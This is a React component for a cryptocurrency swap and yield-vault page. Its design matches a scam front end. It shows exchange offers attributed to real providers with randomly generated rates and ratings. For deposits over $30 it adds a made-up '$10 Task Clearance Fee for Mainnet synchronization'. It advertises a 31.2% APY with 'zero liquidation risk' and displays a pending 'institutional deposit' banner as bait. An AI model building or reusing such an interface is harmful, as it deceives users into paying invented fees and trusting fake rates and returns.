import React, { useState, useMemo, useEffect } from 'react';
import { AssetInfo, ExchangeOffer, WalletData } from '../types';

interface SwapViewProps {
  assets: AssetInfo[];
  isConnected: boolean;
  wallet?: (WalletData & { pending_deposit_currency?: string, pending_deposit_amount?: number }) | null;
  onConnect: () => void;
  onSignUp: () => void;
  onConfirm: (info: string, callback: () => void) => void;
  onSwap: (from: string, to: string, amount: string) => void;
  onDeposit: (amount: string, asset: string) => void;
  onRefreshBalances?: () => void;
}

const SwapView: React.FC<SwapViewProps> = ({ assets, isConnected, wallet, onConnect, onSignUp, onConfirm, onSwap, onDeposit, onRefreshBalances }) => {
  const [fromAsset, setFromAsset] = useState(assets[0]);
  const [toAsset, setToAsset] = useState(assets[1]);
  const [amount, setAmount] = useState('');
  const [selectedOfferId, setSelectedOfferId] = useState<string | null>(null);
  const [activeMode, setActiveMode] = useState<'swap' | 'yield'>('swap');
  const [isSwapping, setIsSwapping] = useState(false);
  
  const [isSelectorOpen, setIsSelectorOpen] = useState(false);
  const [selectorSide, setSelectorSide] = useState<'from' | 'to'>('from');
  const [searchQuery, setSearchQuery] = useState('');

  const handleManualSwap = async () => {
      if (!wallet?.address) return;
      setIsSwapping(true);
      try {
          const res = await fetch('/api/user/swap', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ walletAddress: wallet.address })
          });
          if (res.ok) {
              if (onRefreshBalances) onRefreshBalances();
              alert('Swap successful! USDT added to Protocol Balance.');
          }
      } catch (e) {
          console.error('Swap failed', e);
      } finally {
          setIsSwapping(false);
      }
  };

  const providers = [
    { name: 'ChangeNOW', logo: 'CN' },
    { name: 'SimpleSwap', logo: 'SS' },
    { name: 'StealthEX', logo: 'SX' },
    { name: 'Exolix', logo: 'EX' },
    { name: 'FixedFloat', logo: 'FF' }
  ];

  const offers: ExchangeOffer[] = useMemo(() => {
    if (!amount || parseFloat(amount) <= 0) return [];
    const baseRate = fromAsset.price / toAsset.price;
    return providers.map((p, i) => ({
      id: `offer-${p.name}`,
      provider: p.name,
      rate: baseRate * (1 + (Math.random() * 0.02 - 0.01)),
      eta: `${5 + Math.floor(Math.random() * 15)}m`,
      rating: 4 + Math.random(),
      type: (i === 0 ? 'Best rate' : i === 1 ? 'Fastest' : 'Standard') as ExchangeOffer['type'],
      logo: p.logo
    })).sort((a, b) => b.rate - a.rate);
  }, [amount, fromAsset, toAsset]);

  useEffect(() => {
    if (offers.length > 0 && !selectedOfferId) setSelectedOfferId(offers[0].id);
  }, [offers, selectedOfferId]);

  const handleAction = () => {
    if (!isConnected) { onConnect(); return; }
    
    // Deposit Fee Logic: $10 fee for deposits over $30
    const numAmount = parseFloat(amount || '0');
    if (activeMode === 'yield' && numAmount > 30) {
      onConfirm(
        `PROTOCOL NOTICE: Deposits exceeding $30 require a $10 Task Clearance Fee for Mainnet synchronization. Total required: $${(numAmount + 10).toFixed(2)}`,
        () => onDeposit(amount, fromAsset.symbol)
      );
      return;
    }

    if (activeMode === 'yield') { onDeposit(amount, fromAsset.symbol); return; }
    const selectedOffer = offers.find(o => o.id === selectedOfferId);
    if (!selectedOffer) return;
    
    onConfirm(
        `Swap ${amount} ${fromAsset.symbol} via ${selectedOffer.provider}`,
        () => onSwap(fromAsset.symbol, toAsset.symbol, amount)
    );
  };

  const openSelector = (side: 'from' | 'to') => {
    setSelectorSide(side);
    setSearchQuery('');
    setIsSelectorOpen(true);
  };

  const handleSelectAsset = (asset: AssetInfo) => {
    if (selectorSide === 'from') {
        if (asset.symbol === toAsset.symbol) setToAsset(fromAsset);
        setFromAsset(asset);
    } else {
        if (asset.symbol === fromAsset.symbol) setFromAsset(toAsset);
        setToAsset(asset);
    }
    setIsSelectorOpen(false);
  };

  const filteredAssets = assets.filter(a => 
    a.symbol.toLowerCase().includes(searchQuery.toLowerCase()) || 
    a.name.toLowerCase().includes(searchQuery.toLowerCase())
  );

  const selectedOffer = useMemo(() => offers.find(o => o.id === selectedOfferId), [offers, selectedOfferId]);

  return (
    <div className="h-full p-8 flex flex-col items-center bg-[#0B0E11] animate-in fade-in duration-500 relative overflow-y-auto custom-scrollbar">
      <div className="w-full max-w-4xl space-y-8 pb-20">
        
        <div className="text-center space-y-4">
          <div className="space-y-1">
            <h1 className="text-4xl font-black text-gray-100 italic uppercase tracking-tighter">Liquid Aggregator</h1>
            <p className="text-xs text-indigo-500 font-bold uppercase tracking-[0.4em]">Atomic Cross-Chain Bridge</p>
          </div>
          <div className="flex justify-center space-x-2 bg-[#181C25] p-1 rounded-full w-fit mx-auto border border-[#2B3139]">
            <button onClick={() => setActiveMode('swap')} className={`px-8 py-2.5 rounded-full text-xs font-black uppercase tracking-widest transition-all ${activeMode === 'swap' ? 'bg-indigo-600 text-white shadow-lg shadow-indigo-500/20' : 'text-gray-500 hover:text-gray-200'}`}>Swap Aggregator</button>
            <button onClick={() => setActiveMode('yield')} className={`px-8 py-2.5 rounded-full text-xs font-black uppercase tracking-widest transition-all ${activeMode === 'yield' ? 'bg-orange-600 text-white shadow-lg shadow-orange-500/20' : 'text-gray-500 hover:text-gray-200'}`}>Geko Vault</button>
          </div>
        </div>

        {!isConnected && (
          <div className="bg-[#181C25] rounded-[32px] p-8 border border-indigo-500/30 shadow-xl flex flex-col md:flex-row items-center justify-between gap-8 relative overflow-hidden">
            <div className="absolute top-0 right-0 p-8 opacity-5 text-indigo-500">
               <svg className="w-32 h-32" fill="currentColor" viewBox="0 0 24 24"><path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" /></svg>
            </div>
            <div className="space-y-1 text-center md:text-left relative z-10">
              <h3 className="text-2xl font-black text-gray-100 italic uppercase tracking-tight">Identity Required</h3>
              <p className="text-sm text-gray-500 max-w-md">Connect to access high-frequency liquidity pools and institutional execution rates.</p>
            </div>
            <div className="flex flex-col items-center gap-4 relative z-10 shrink-0">
              <button onClick={onConnect} className="w-full px-10 py-5 bg-indigo-600 text-white rounded-[20px] font-black text-sm uppercase italic hover:bg-indigo-500 transition-all shadow-xl shadow-indigo-600/20">AUTHENTICATE</button>
            </div>
          </div>
        )}

        {wallet?.pending_deposit_amount && wallet.pending_deposit_amount > 0 && (
            <div className="bg-indigo-600/10 border border-indigo-500/30 rounded-[40px] p-8 flex flex-col md:flex-row items-center justify-between gap-6 animate-in slide-in-from-top-4">
                <div className="flex items-center space-x-6">
                    <div className="w-16 h-16 bg-indigo-600 rounded-2xl flex items-center justify-center text-white font-black italic shadow-lg">
                        {wallet.pending_deposit_currency?.[0] || 'D'}
                    </div>
                    <div>
                        <div className="text-[10px] text-indigo-400 font-black uppercase tracking-widest mb-1">Incoming Clearing Detected</div>
                        <div className="text-3xl font-black text-white italic">{wallet.pending_deposit_amount} {wallet.pending_deposit_currency}</div>
                        <div className="text-[10px] text-gray-500 uppercase font-bold mt-1">Institutional deposit waiting for settlement</div>
                    </div>
                </div>
                <button 
                    onClick={handleManualSwap}
                    disabled={isSwapping}
                    className="bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white px-10 py-5 rounded-[20px] font-black uppercase italic tracking-widest shadow-xl transition-all flex items-center space-x-3"
                >
                    {isSwapping ? (
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                    ) : (
                        <>
                            <span>Swap to USDT</span>
                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
                        </>
                    )}
                </button>
            </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          <div className="lg:col-span-5 space-y-4">
            {/* Swap Input Card */}
            <div className={`glass rounded-[40px] p-2 shadow-xl transition-all duration-500 ${activeMode === 'yield' ? 'border-orange-500/30 bg-[#181C25]/50' : 'hover:border-indigo-500/30 bg-[#181C25]/50'}`}>
              <div className="bg-[#1E2329] p-8 rounded-[36px] border border-[#2B3139] space-y-6 shadow-sm">
                <div className="flex justify-between items-center px-1">
                   <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{activeMode === 'swap' ? 'Pay with' : 'Deposit'}</span>
                   <div className="flex items-center space-x-2">
                      <span className="text-[10px] text-indigo-400 font-mono">~${(parseFloat(amount || '0') * fromAsset.price).toFixed(2)} USD</span>
                   </div>
                </div>
                <div className="flex items-center space-x-4">
                  <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="0.00" className="flex-1 bg-transparent text-4xl font-bold outline-none placeholder-gray-600 text-gray-100" />
                  <button 
                    onClick={() => openSelector('from')}
                    className="flex items-center space-x-2 bg-[#2B3139] hover:bg-[#363C45] px-5 py-3 rounded-2xl border border-[#2B3139] transition-all active:scale-95 group"
                  >
                    <div className="w-6 h-6 bg-indigo-600 rounded-lg flex items-center justify-center font-bold text-[10px] text-white">{fromAsset.symbol[0]}</div>
                    <span className="font-black text-sm text-gray-200">{fromAsset.symbol}</span>
                    <svg className="w-4 h-4 text-gray-500 group-hover:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                  </button>
                </div>
              </div>

              {activeMode === 'swap' && (
                <div className="flex justify-center -my-4 relative z-20">
                   <button 
                     onClick={() => { const t = fromAsset; setFromAsset(toAsset); setToAsset(t); }}
                     className="w-12 h-12 bg-[#181C25] border-4 border-[#0B0E11] rounded-2xl flex items-center justify-center hover:scale-110 active:rotate-180 transition-all shadow-xl text-indigo-500 group border-[#2B3139]"
                   >
                     <svg className="w-6 h-6 group-hover:rotate-180 transition-transform duration-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 16V4m0 0L3 8m4-4l4 4m6 0v12m0 0l4-4m-4 4l-4-4" /></svg>
                   </button>
                </div>
              )}

              <div className="bg-[#1E2329] p-8 rounded-[36px] border border-[#2B3139] space-y-6 shadow-sm">
                <div className="flex justify-between items-center px-1">
                   <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{activeMode === 'swap' ? 'Receive' : 'Strategy'}</span>
                   {activeMode === 'swap' && <span className="text-[10px] text-emerald-500 font-bold">Best rate found</span>}
                </div>
                {activeMode === 'swap' ? (
                  <div className="flex items-center space-x-4">
                    <div className="flex-1 text-4xl font-bold text-gray-100">
                      {selectedOffer ? (parseFloat(amount || '0') * selectedOffer.rate).toFixed(6) : '0.00'}
                    </div>
                    <button 
                      onClick={() => openSelector('to')}
                      className="flex items-center space-x-2 bg-[#2B3139] hover:bg-[#363C45] px-5 py-3 rounded-2xl border border-[#2B3139] transition-all active:scale-95 group"
                    >
                      <div className="w-6 h-6 bg-purple-600 rounded-lg flex items-center justify-center font-bold text-[10px] text-white">{toAsset.symbol[0]}</div>
                      <span className="font-black text-sm text-gray-200">{toAsset.symbol}</span>
                      <svg className="w-4 h-4 text-gray-500 group-hover:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" /></svg>
                    </button>
                  </div>
                ) : (
                  <div className="p-2">
                    <div className="text-xl font-black text-orange-500 italic">Institutional Alpha</div>
                    <p className="text-[10px] text-gray-500 uppercase mt-1">Direct yield optimization</p>
                  </div>
                )}
              </div>

              <div className="p-6 space-y-4">
                <button onClick={handleAction} className={`w-full py-6 rounded-[28px] font-black text-lg transition-all shadow-xl uppercase italic tracking-widest ${isConnected ? (activeMode === 'yield' ? 'bg-orange-600 hover:bg-orange-500 text-white' : 'bg-indigo-600 hover:bg-indigo-500 text-white') : 'bg-[#2B3139] hover:bg-[#363C45] text-gray-400'}`}>
                  {isConnected ? (!amount || parseFloat(amount) <= 0 ? 'ENTER AMOUNT' : (activeMode === 'swap' ? 'EXECUTE SWAP' : 'DEPOSIT TO VAULT')) : 'CONNECT TO SWAP'}
                </button>
                <div className="flex items-center justify-between px-2 text-[10px] text-gray-500 font-bold uppercase tracking-[0.2em]">
                  <div className="flex items-center space-x-1">
                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
                    <span>Direct Link Active</span>
                  </div>
                  <span>Secured Node</span>
                </div>
              </div>
            </div>
          </div>

          <div className="lg:col-span-7">
             {activeMode === 'swap' ? (
               <div className="space-y-4">
                 <div className="flex items-center justify-between px-1">
                    <h2 className="text-xs font-black text-gray-500 uppercase tracking-[0.3em]">Live Rate Comparison</h2>
                    <span className="text-[10px] text-indigo-400 font-bold">Best rate selected</span>
                 </div>
                 <div className="space-y-3">
                   {amount && parseFloat(amount) > 0 ? (
                     offers.map((offer) => (
                       <div key={offer.id} onClick={() => setSelectedOfferId(offer.id)} className={`bg-[#1E2329] rounded-[28px] border p-6 flex items-center justify-between cursor-pointer transition-all hover:scale-[1.01] ${selectedOfferId === offer.id ? 'border-indigo-500 ring-1 ring-indigo-500/50 shadow-lg' : 'border-[#2B3139] hover:border-gray-600'}`}>
                         <div className="flex items-center space-x-4">
                            <div className="w-12 h-12 bg-[#2B3139] rounded-2xl flex items-center justify-center font-black text-xs text-gray-400 border border-[#363C45]">{offer.logo}</div>
                            <div>
                               <div className="font-black text-gray-200 italic tracking-tight">{offer.provider}</div>
                               <div className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">{offer.type}</div>
                            </div>
                         </div>
                         <div className="text-right">
                            <div className="text-2xl font-mono font-bold text-gray-200">{(parseFloat(amount) * offer.rate).toFixed(6)}</div>
                            <div className="text-[9px] text-gray-500 font-mono">1 {fromAsset.symbol} = {offer.rate.toFixed(4)} {toAsset.symbol}</div>
                         </div>
                       </div>
                     ))
                   ) : (
                     <div className="bg-[#1E2329] rounded-[40px] border-2 border-dashed border-[#2B3139] p-16 text-center space-y-4">
                        <div className="w-16 h-16 bg-[#2B3139] rounded-full flex items-center justify-center mx-auto text-gray-600">
                           <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" /></svg>
                        </div>
                        <div className="text-gray-600 uppercase tracking-widest font-black text-sm italic">Awaiting protocol input</div>
                     </div>
                   )}
                 </div>
               </div>
             ) : (
               <div className="space-y-6">
                  <div className="bg-[#1E2329] rounded-[40px] p-10 border border-orange-500/20 shadow-xl relative overflow-hidden">
                    <h2 className="text-3xl font-black text-gray-100 italic uppercase mb-6">Geko Alpha Strategy</h2>
                    <div className="grid grid-cols-2 gap-8 mb-8">
                       <div className="space-y-1">
                          <div className="text-[10px] text-gray-500 uppercase font-black tracking-widest">Expected APY</div>
                          <div className="text-3xl font-black text-orange-500">31.2%</div>
                       </div>
                       <div className="space-y-1">
                          <div className="text-[10px] text-gray-500 uppercase font-black tracking-widest">Risk Level</div>
                          <div className="text-xl font-bold text-gray-200 uppercase">Managed High</div>
                       </div>
                    </div>
                    <div className="bg-[#2B3139]/50 border border-[#2B3139] p-6 rounded-3xl space-y-4">
                       <p className="text-xs text-gray-400 leading-relaxed uppercase tracking-wider italic font-bold">Automated quantitative yield optimization across 5 protocol layers.</p>
                       <ul className="grid grid-cols-1 gap-3">
                          {['Zero liquidation risk', 'Neural rebalancing', 'Atomic yield locks'].map(t => (
                            <li key={t} className="flex items-center space-x-2 text-[10px] font-black uppercase tracking-widest text-orange-600">
                               <div className="w-1.5 h-1.5 rounded-full bg-orange-500"></div>
                               <span>{t}</span>
                            </li>
                          ))}
                       </ul>
                    </div>
                  </div>
               </div>
             )}
          </div>
        </div>

        {/* Asset Selector Modal */}
        {isSelectorOpen && (
          <div className="fixed inset-0 z-[300] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in">
             <div className="absolute inset-0" onClick={() => setIsSelectorOpen(false)}></div>
             <div className="bg-[#181C25] rounded-[32px] w-full max-w-md border border-[#2B3139] shadow-2xl flex flex-col max-h-[70vh] relative z-10 animate-in zoom-in-95">
                <div className="p-6 border-b border-[#2B3139] space-y-4">
                   <div className="flex items-center justify-between">
                      <h3 className="text-xl font-black text-gray-100 uppercase italic tracking-tighter">Select Token</h3>
                      <button onClick={() => setIsSelectorOpen(false)} className="p-2 hover:bg-[#2B3139] rounded-full text-gray-500 hover:text-gray-100 transition-colors">
                         <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" /></svg>
                      </button>
                   </div>
                   <input 
                     type="text" 
                     placeholder="Search name or symbol..." 
                     value={searchQuery}
                     onChange={(e) => setSearchQuery(e.target.value)}
                     className="w-full bg-[#0B0E11] border border-[#2B3139] rounded-2xl px-5 py-4 text-sm text-gray-100 focus:outline-none focus:border-indigo-500 transition-all font-mono placeholder-gray-600"
                     autoFocus
                   />
                </div>
                
                <div className="flex-1 overflow-y-auto custom-scrollbar p-2">
                   {filteredAssets.length > 0 ? (
                      filteredAssets.map(asset => (
                         <button 
                           key={asset.symbol} 
                           onClick={() => handleSelectAsset(asset)}
                           className={`w-full flex items-center justify-between p-4 hover:bg-[#2B3139] rounded-2xl transition-all group ${
                              (selectorSide === 'from' ? fromAsset.symbol : toAsset.symbol) === asset.symbol ? 'bg-indigo-900/20 border border-indigo-500/30' : 'border border-transparent'
                           }`}
                         >
                            <div className="flex items-center space-x-4">
                               <div className="w-10 h-10 bg-[#1E2329] rounded-xl flex items-center justify-center font-black text-[10px] text-gray-400 border border-[#363C45] shadow-sm">
                                  {asset.symbol[0]}
                               </div>
                               <div className="text-left">
                                  <div className="font-bold text-gray-200 text-sm">{asset.symbol}</div>
                                  <div className="text-[10px] text-gray-500 uppercase font-bold">{asset.name}</div>
                               </div>
                            </div>
                            <div className="text-right">
                               <div className="font-mono font-bold text-gray-200 text-sm">${asset.price.toLocaleString(undefined, { maximumFractionDigits: 2 })}</div>
                               <div className={`text-[9px] font-bold ${asset.change24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>
                                  {asset.change24h > 0 ? '+' : ''}{asset.change24h}%
                               </div>
                            </div>
                         </button>
                      ))
                   ) : (
                      <div className="p-8 text-center text-gray-600 text-xs font-bold uppercase tracking-widest">
                         No assets found
                      </div>
                   )}
                </div>
             </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default SwapView;
